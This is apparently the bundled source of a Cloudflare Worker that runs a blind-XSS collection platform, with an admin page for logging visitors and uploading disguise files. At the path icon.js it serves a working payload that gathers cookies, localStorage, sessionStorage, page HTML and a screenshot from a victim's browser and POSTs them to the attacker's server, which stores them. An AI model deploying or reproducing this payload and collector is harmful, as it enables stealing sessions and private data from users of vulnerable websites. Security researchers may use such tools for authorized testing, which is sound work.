var KEY = "pXDvJQs2FZ8BM";
var DEFAULT_SCRIPT_NAME = "icon.js";

var __create = Object.create;
var __defProp = Object.defineProperty;
var __getOwnPropDesc = Object.getOwnPropertyDescriptor;
var __getOwnPropNames = Object.getOwnPropertyNames;
var __getProtoOf = Object.getPrototypeOf;
var __hasOwnProp = Object.prototype.hasOwnProperty;
var __commonJS = (cb, mod) => function __require() {
  return mod || (0, cb[__getOwnPropNames(cb)[0]])((mod = { exports: {} }).exports, mod), mod.exports;
};
var __copyProps = (to, from, except, desc) => {
  if (from && typeof from === "object" || typeof from === "function") {
    for (let key of __getOwnPropNames(from))
      if (!__hasOwnProp.call(to, key) && key !== except)
        __defProp(to, key, { get: () => from[key], enumerable: !(desc = __getOwnPropDesc(from, key)) || desc.enumerable });
  }
  return to;
};
var __toESM = (mod, isNodeMode, target) => (target = mod != null ? __create(__getProtoOf(mod)) : {}, __copyProps(
    isNodeMode || !mod || !mod.__esModule ? __defProp(target, "default", { value: mod, enumerable: true }) : target,
    mod
));

// node_modules/base64-js/index.js
var require_base64_js = __commonJS({
  "node_modules/base64-js/index.js"(exports) {
    "use strict";
    exports.byteLength = byteLength;
    exports.toByteArray = toByteArray;
    exports.fromByteArray = fromByteArray;
    var lookup = [];
    var revLookup = [];
    var Arr = typeof Uint8Array !== "undefined" ? Uint8Array : Array;
    var code = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    for (i = 0, len = code.length; i < len; ++i) {
      lookup[i] = code[i];
      revLookup[code.charCodeAt(i)] = i;
    }
    var i;
    var len;
    revLookup["-".charCodeAt(0)] = 62;
    revLookup["_".charCodeAt(0)] = 63;
    function getLens(b64) {
      var len2 = b64.length;
      if (len2 % 4 > 0) {
        throw new Error("Invalid string. Length must be a multiple of 4");
      }
      var validLen = b64.indexOf("=");
      if (validLen === -1)
        validLen = len2;
      var placeHoldersLen = validLen === len2 ? 0 : 4 - validLen % 4;
      return [validLen, placeHoldersLen];
    }
    function byteLength(b64) {
      var lens = getLens(b64);
      var validLen = lens[0];
      var placeHoldersLen = lens[1];
      return (validLen + placeHoldersLen) * 3 / 4 - placeHoldersLen;
    }
    function _byteLength(b64, validLen, placeHoldersLen) {
      return (validLen + placeHoldersLen) * 3 / 4 - placeHoldersLen;
    }
    function toByteArray(b64) {
      var tmp;
      var lens = getLens(b64);
      var validLen = lens[0];
      var placeHoldersLen = lens[1];
      var arr = new Arr(_byteLength(b64, validLen, placeHoldersLen));
      var curByte = 0;
      var len2 = placeHoldersLen > 0 ? validLen - 4 : validLen;
      var i2;
      for (i2 = 0; i2 < len2; i2 += 4) {
        tmp = revLookup[b64.charCodeAt(i2)] << 18 | revLookup[b64.charCodeAt(i2 + 1)] << 12 | revLookup[b64.charCodeAt(i2 + 2)] << 6 | revLookup[b64.charCodeAt(i2 + 3)];
        arr[curByte++] = tmp >> 16 & 255;
        arr[curByte++] = tmp >> 8 & 255;
        arr[curByte++] = tmp & 255;
      }
      if (placeHoldersLen === 2) {
        tmp = revLookup[b64.charCodeAt(i2)] << 2 | revLookup[b64.charCodeAt(i2 + 1)] >> 4;
        arr[curByte++] = tmp & 255;
      }
      if (placeHoldersLen === 1) {
        tmp = revLookup[b64.charCodeAt(i2)] << 10 | revLookup[b64.charCodeAt(i2 + 1)] << 4 | revLookup[b64.charCodeAt(i2 + 2)] >> 2;
        arr[curByte++] = tmp >> 8 & 255;
        arr[curByte++] = tmp & 255;
      }
      return arr;
    }
    function tripletToBase64(num) {
      return lookup[num >> 18 & 63] + lookup[num >> 12 & 63] + lookup[num >> 6 & 63] + lookup[num & 63];
    }
    function encodeChunk(uint8, start, end) {
      var tmp;
      var output = [];
      for (var i2 = start; i2 < end; i2 += 3) {
        tmp = (uint8[i2] << 16 & 16711680) + (uint8[i2 + 1] << 8 & 65280) + (uint8[i2 + 2] & 255);
        output.push(tripletToBase64(tmp));
      }
      return output.join("");
    }
    function fromByteArray(uint8) {
      var tmp;
      var len2 = uint8.length;
      var extraBytes = len2 % 3;
      var parts = [];
      var maxChunkLength = 16383;
      for (var i2 = 0, len22 = len2 - extraBytes; i2 < len22; i2 += maxChunkLength) {
        parts.push(encodeChunk(uint8, i2, i2 + maxChunkLength > len22 ? len22 : i2 + maxChunkLength));
      }
      if (extraBytes === 1) {
        tmp = uint8[len2 - 1];
        parts.push(
            lookup[tmp >> 2] + lookup[tmp << 4 & 63] + "=="
        );
      } else if (extraBytes === 2) {
        tmp = (uint8[len2 - 2] << 8) + uint8[len2 - 1];
        parts.push(
            lookup[tmp >> 10] + lookup[tmp >> 4 & 63] + lookup[tmp << 2 & 63] + "="
        );
      }
      return parts.join("");
    }
  }
});

// index.js
var import_base64_js = __toESM(require_base64_js());
var cloudflare_xss_default = {
  async fetch(request, env) {
    return await handleRequest(request, env);
  }
};
function getUuid() {
  return "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, function(c) {
    const r = Math.random() * 16 | 0, v = c === "x" ? r : r & 3 | 8;
    return v.toString(16);
  });
}
async function readRequestBody(request) {
  const { headers } = request;
  const contentType = headers.get("content-type") || "";
  if (contentType.includes("application/json")) {
    return JSON.stringify(await request.json());
  } else if (contentType.includes("text")) {
    return request.text();
  } else if (contentType.includes("form")) {
    const formData = await request.formData();
    const body = {};
    for (const entry of formData.entries()) {
      body[entry[0]] = entry[1];
    }
    return JSON.stringify(body);
  } else {
    throw "Unsupported content-type.";
  }
}
var escapeHtml = (unsafe) => {
  if (unsafe === void 0)
    return void 0;
  if (unsafe === null)
    return null;
  return unsafe.replaceAll("&", "&amp;").replaceAll("<", "&lt;").replaceAll(">", "&gt;").replaceAll('"', "&quot;").replaceAll("'", "&#039;");
};
var adminPageTemplate = '<!DOCTYPE html>\n<html lang="en">\n<head>\n    <meta charset="UTF-8">\n    <title>Cloudflare XSS Platform Admin</title>\n    <style>\n        table, td {\n            border-collapse: separate;\n            border: 1px solid #999;\n        }\n    </style>\n</head>\n<body>\n<h2>Cloudflare XSS Platform</h2>\n<a href="https://www.github.com/lyc8503">GitHub \u5730\u5740</a>\n\n<h4>\u4E0A\u4F20\u4F2A\u88C5\u6587\u4EF6</h4>\n<form action="?upload=do" method="post">\n    \u6587\u4EF6\u540D\u79F0: <input type="text" name="name"><br>\n    \u6587\u4EF6 BASE64 \u5185\u5BB9: <input type="text" name="base64">\n    <input type="submit" value="\u4FDD\u5B58">\n</form>\n\n<h4>\u8BBF\u95EE\u8BB0\u5F55</h4>\n\n<table>\n    <tr>\n        <th>\u8BBF\u95EE\u65F6\u95F4</th>\n        <th>\u8BBF\u95EEURL</th>\n        <th>IP</th>\n        <th>IP\u5730\u533A</th>\n        <th>UA</th>\n        <th>Referer</th>\n        <th>POST\u6570\u636E</th>\n    </tr>\n    ###TABLE###\n</table>\n</body>\n</html>';
async function handleRequest(request, env) {
  const url = new URL(request.url);
  if (url.pathname.substring(1).startsWith(KEY)) {
    if (url.search !== "") {
      const searchParams = new URLSearchParams(url.search);
      if (searchParams.has("key")) {
        const data = await env.kv_storage.get(searchParams.get("key"));
        if (data === null) {
          return new Response("\u51FA\u73B0\u9519\u8BEF, \u6570\u636E\u672A\u627E\u5230.");
        }
        return new Response(data);
      }
      if (searchParams.has("upload")) {
        const body = JSON.parse(await readRequestBody(request));
        await env.kv_storage.put("file_" + body.name, body.base64);
        return new Response("\u6587\u4EF6\u4E0A\u4F20\u6210\u529F: " + body.name);
      }
      return new Response("\u672A\u77E5\u8BF7\u6C42");
    } else {
      let tableHtml = "";
      const keys = (await env.kv_storage.list()).keys.sort((a, b) => {
        return b.name.split("_", 3)[1] * 1 - a.name.split("_", 3)[1] * 1;
      });
      for (let item of keys) {
        try {
          if (item.name.split("_", 3)[0] !== "get" && item.name.split("_", 3)[0] !== "post") {
            continue;
          }
          if (item.metadata === void 0) {
            item.metadata = {};
          }
          tableHtml += "<tr><td>" + new Date(item.name.split("_", 3)[1] * 1).toLocaleString("zh-CN") + "</td><td>" + escapeHtml(item.metadata.url) + "</td><td>" + escapeHtml(item.metadata.src_ip) + "</td><td>" + escapeHtml(item.metadata.src_country) + "</td><td>" + escapeHtml(item.metadata.ua) + "</td><td>" + escapeHtml(item.metadata.referer) + "</td>" + (item.name.split("_", 3)[0] === "post" ? '<td><a href="?key=' + escapeHtml(item.name) + '">\u70B9\u6B64\u67E5\u770B POST \u5185\u5BB9</a></td>' : "<td>GET \u8BF7\u6C42, \u65E0\u8BE6\u7EC6\u6570\u636E</td>") + "</tr>";
        } catch (e) {
          console.error(e);
        }
      }
      return new Response(adminPageTemplate.replace("###TABLE###", tableHtml), {
        headers: {
          "Content-Type": "text/html;charset=UTF-8"
        }
      });
    }
  }
  const corsHeaders = {
    "Access-Control-Allow-Origin": "*",
    "Access-Control-Allow-Methods": "GET,HEAD,POST,OPTIONS",
    "Access-Control-Max-Age": "86400"
  };
  const metadata = {
    url: request.url,
    src_ip: request.headers.get("cf-connecting-ip"),
    src_country: request.headers.get("cf-ipcountry"),
    ua: request.headers.get("User-Agent"),
    referer: request.headers.get("referer")
  };
  if (request.method === "GET") {
    const randomKey = "get_" + new Date().getTime() + "_" + getUuid();
    await env.kv_storage.put(randomKey, "", {
      metadata
    });
    console.log("GET request logged: " + JSON.stringify(metadata));
    let b64Data = null;
    if (url.pathname.substring(1) !== "" && url.pathname.substring(1) !== DEFAULT_SCRIPT_NAME) {
      console.log("Try fetching data from kv storage: " + url.pathname.substring(1));
      b64Data = await env.kv_storage.get("file_" + url.pathname.substring(1));
      if (b64Data === null) {
        console.log("Missing key from kv storage, using default.");
        b64Data = "iVBORw0KGgoAAAANSUhEUgAAAIIAAACCCAMAAAC93eDPAAAAmVBMVEUAmf/////3/P/o9f8sqv/a8P8kp/8Onv/t9/+y4P8ao/8Vof/k9P/H6f8Jnf/e8v9Bs/8Em/9Puf8oqf/7/f/V7v9bvf88sf84r//z+v/B5v/q9/+85P+Z1v92yP9ow/9iwP8fpf/S7f/N6/+l2/+T1P9Vu/8yrf+c1/+P0v+Dzf99yv9uxf/v+f+r3f+K0P9Itv+g2f+M0f/mMGiUAAACrklEQVR42u3Y2ZKqMBSF4bUjqIAyOIG282xr28P7P9w5hSFIG6r6AsLN/i4pC35LdoiAMcYYY4wxxhhjjD3x1vt+ILrj+SWM0IRBn3IfCxemxTMqEj8dGLUc0YvAgjn+nnSmA5jiz6iEiQZVoDe1oFFrQf86SMLJuUUZuwMD7pSZn/AQrVTEJwxo2/RwRc7tZ7PpwgAvvdxogmd+1nCACb6jCnKu/C26EYw4qILcih5imGHhRdRTN2RjDnJO0JwjpbZoTiLvRzTHkisD6hKFP/NxVwT9/cSDVkipHurhHbqkjOYxJM1U9lGHzvuUihwLLxxK3VGDzZZeiAl+cQWlbqhe/EY67yhayOMbVO5LkN4Czwby6NhgAS3x5JTdLWtULcwLWudJmAyuO812AVY2MHZUX0H3lp087r88jSx1uxxRsVgN43YDJboQHfQF36hYogpmHTy7fusL+n7VBR/q1B2Us1ok9VxU6/S3gmFe0K66oEvSrqECq/mCNzULXjMFbXXqsfenj7WqLvC3+oJNu1jQUwVDVOxOku0WCoJuiFzYra9grS9wbaLRxVMbqVF9BVFAD8Hmd8F/wll9JV8rR1B9BeqvWa9Q4I1Jr2WhcjalRIJnM9J7q6Ggrd+ZtcekM26jeje5QeigqOPQK6eDGsgrnTWT0qOi3hq12JW/wPOXAeWCpY96yK9qQctaOruWaO2cpYXayIH30By57LbRHDl8IZozV8tCYz5LX9hEe0NdYelr9T3R3IMB0UfJK+3vdDE4wYBFtvii4EwpsUb9XKEeANonRIL6XUgKjpCONmVWMMALKGNfjnF8/LFJucGIk6AyNxgyoRJLGDMRpCHWMChpabaJMYxyFyMqGJ1dmDbcC1LEfYgm+IPFzJ5O7dli4IMxxhhjjDHGGGOM5f4BbwolWT7KQNsAAAAASUVORK5CYII=";
      } else {
        console.log("Got data from kv storage, length: " + b64Data.length);
      }
      return new Response(import_base64_js.default.toByteArray(b64Data));
    } else if (url.pathname.substring(1) !== "" && url.pathname.substring(1) === DEFAULT_SCRIPT_NAME) {
      return new Response(`// From https://github.com/mazen160/xless/blob/master/payload.js

console.log("Loaded script.");
var collected_data = {};

var curScript = document.currentScript;

function return_value(value) {
    return (value !== undefined) ? value : ""
}

function screenshot() {
    return new Promise(function (resolve, reject) {
        html2canvas(document.querySelector("html"), { letterRendering: 1, allowTaint: true, useCORS: true, width: 1024, height: 768}).then(function (canvas) {
            resolve(return_value(canvas.toDataURL())) // png in dataURL format
        });
    });
}


function collect_data() {
    return new Promise(function (resolve, reject) {
        collected_data["Cookies"] = collected_data["Location"] = collected_data["Referrer"] = collected_data["User-Agent"] = collected_data["Browser Time"] = collected_data["Origin"] = collected_data["DOM"] = collected_data["localStorage"] = collected_data["sessionStorage"] = collected_data["Screenshot"] = "";

        try { collected_data["Location"] = return_value(location.toString()) } catch(e) {}
        try { collected_data["Cookies"] = return_value(document.cookie) } catch(e) {}
        try { collected_data["Referrer"] = return_value(document.referrer) } catch(e) {}
        try { collected_data["User-Agent"] = return_value(navigator.userAgent); } catch(e) {}
        try { collected_data["Browser Time"] = return_value(new Date().toTimeString()); } catch(e) {}
        try { collected_data["Origin"] = return_value(location.origin); } catch(e) {}
        try { collected_data["DOM"] = return_value(document.documentElement.outerHTML); } catch(e) {}
        collected_data["DOM"] = collected_data["DOM"].slice(0, 8192)
        try { collected_data["localStorage"] = return_value(localStorage.toSource()); } catch(e) {}
        try { collected_data["sessionStorage"] = return_value(sessionStorage.toSource()); } catch(e) {}
        try {
            screenshot().then(function(img) {
                collected_data["Screenshot"] = img
                resolve(collected_data)
            });
        } catch(e) {
            resolve(collected_data)
        }
    });
}


function exfiltrate_loot() {
    // Get the URI of our BXSS server
    var uri = new URL(curScript.src);
    var exf_url = uri.origin + "/"

    var xhr = new XMLHttpRequest()
    xhr.open("POST", exf_url, true)
    xhr.setRequestHeader("Content-Type", "application/json")
    xhr.send(JSON.stringify(collected_data))
}

// Load the html2canvas dependency
(function(d, script) {
    script = d.createElement('script');
    script.type = 'text/javascript';
    script.async = true;
    script.onload = function(){
        // remote script has loaded
        collect_data().then(function() {
            exfiltrate_loot();
        });
    };
    script.src = "https://cdn.jsdelivr.net/npm/html2canvas@1.0.0-rc.7/dist/html2canvas.min.js";
    d.getElementsByTagName('head')[0].appendChild(script);
}(document));
`);
    }
    return new Response("");
  } else if (request.method === "POST") {
    const data = await readRequestBody(request);
    const randomKey = "post_" + new Date().getTime() + "_" + getUuid();
    await env.kv_storage.put(randomKey, data, {
      metadata
    });
    console.log("POST request metadata: " + JSON.stringify(metadata));
    console.log("POST request saved: " + data.length);
    return new Response("ok", {
      headers: corsHeaders
    });
  } else if (request.method === "OPTIONS") {
    return new Response(null, {
      headers: {
        ...corsHeaders,
        "Access-Control-Allow-Headers": request.headers.get("Access-Control-Request-Headers")
      }
    });
  } else {
    return new Response("not found", { status: 404 });
  }
}
export {
  cloudflare_xss_default as default
};
//# sourceMappingURL=index.js.map
